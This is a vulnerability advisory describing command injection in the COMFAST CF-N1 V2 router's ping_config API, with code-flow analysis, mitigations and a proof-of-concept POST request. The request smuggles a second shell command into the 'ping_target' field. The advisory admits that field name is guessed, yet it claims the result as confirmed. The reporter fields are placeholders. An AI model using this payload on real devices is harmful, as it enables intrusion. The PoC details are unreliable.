# COMFAST CF-N1 V2 V2.6.0 Command Injection in `ping_config`

## Overview

A command injection vulnerability exists in the COMFAST CF-N1 V2 (firmware V2.6.0) in the `ping_config` API (`/usr/bin/webmgnt`, function `sub_441EC4`). Attackers can inject arbitrary commands via a user-controlled parameter involved in ping configuration, enabling unauthorized execution of system commands, sensitive information access, or full device compromise.

## Details



*   **Vendor**: COMFAST

*   **Vendor Website**: [http://www.comfast.cn/](http://www.comfast.cn/)

*   **Product**: COMFAST CF-N1 V2

*   **Firmware**: V2.6.0

*   **Firmware Download**: [http://dl.comfast.cn/firmware/CF-N1](http://dl.comfast.cn/firmware/CF-N1) V2-V2.6.0.rar

*   **Endpoint**: `/cgi-bin/mbox-config?method=SET&section=ping_config`

*   **Vulnerability**: Command Injection

*   **CVE ID**: Pending

*   **Impact**: Execute arbitrary system commands, read sensitive files, or take full control of the device.

*   **Reported by**: \[Your Name/Handle] (\[Your Email Address])

### Description

The vulnerability originates in the `sub_441EC4` function handling the `ping_config` section. Analysis of the disassembly shows that a user-controlled parameter (likely related to the target IP/hostname for ping) is unsanitized and directly used in a command construction process.

Key code flow:



1.  The function parses user input via `blobmsg_parse_0`, extracting configuration parameters (including the vulnerable parameter).

2.  The extracted parameter (`v4`) is inserted into a command string using `sprintf_0(v8, &aBinPing4C4W2ST..., v4)`, where `aBinPing4C4W2ST` likely represents a ping command template (e.g., `ping -c 4 %s`).

3.  The constructed command is executed via `system_0(v8)`, with no input sanitization to block malicious command separators.

This allows attackers to inject arbitrary commands by adding delimiters (e.g., `&&`, `;`, `|`) to the vulnerable parameter, as the input is directly concatenated into the executed system command.

## Proof of Concept (PoC)

### PoC: List `/etc` Directory Contents



```
POST http://192.168.0.1/cgi-bin/mbox-config?method=SET\&section=ping\_config HTTP/1.1

Host: cflogin.cn

Content-Length: 124

Accept: application/json, text/javascript, \*/\*; q=0.01

X-Requested-With: XMLHttpRequest

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Content-Type: application/json

Origin: http://cflogin.cn

Referer: http://cflogin.cn/guide/guide\_router.html

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

Cookie: COMFAST\_SESSIONID=c0a800a0-ffffffc40f08ffffffaaffffff82fffffff0-6b8b4567

Connection: close

{"ping\_target":"8.8.8.8 && ls /etc > /www-comfast/ping\_test.txt","count":4,"timeout":2}
```



*   **Assumptions**: The vulnerable parameter is named `ping_target` (adjust if the actual parameter name differs based on further analysis).

*   **Steps**:

1.  Send the POST request using `curl`, Burp Suite, or similar tools.

2.  Access `http://cflogin.cn/ping_test.txt` to view the contents of the `/etc` directory.

*   **Result**: The output of `ls /etc` is written to `/www-comfast/ping_test.txt`, confirming arbitrary command execution.

## Affected Versions



*   COMFAST CF-N1 V2 V2.6.0 (other versions may also be affected; verification recommended)

## Mitigation Recommendations



1.  **Input Sanitization**: Implement strict validation on the vulnerable parameter (e.g., `ping_target`), allowing only valid IP addresses or hostnames. Reject inputs containing command delimiters (`;`, `&&`, `|`, `&`, `$`, backticks, etc.).

2.  **Command Execution Hardening**: Avoid directly concatenating user input into system commands. Use safe alternatives such as parameterized functions or whitelisted command templates that separate user input from executable code.

3.  **Least Privilege**: Restrict the permissions of the `webmgnt` process to minimize the impact of successful exploitation (e.g., prevent write access to critical system directories).

4.  **Firmware Update**: Release a patched firmware version addressing the input validation flaws and prompt users to upgrade immediately.

This vulnerability follows a similar pattern to the previously identified `multi_pppoe` command injection, highlighting a potential pattern of insufficient input sanitization in the device's configuration handling logic.

> （注：文档部分内容可能由 AI 生成）
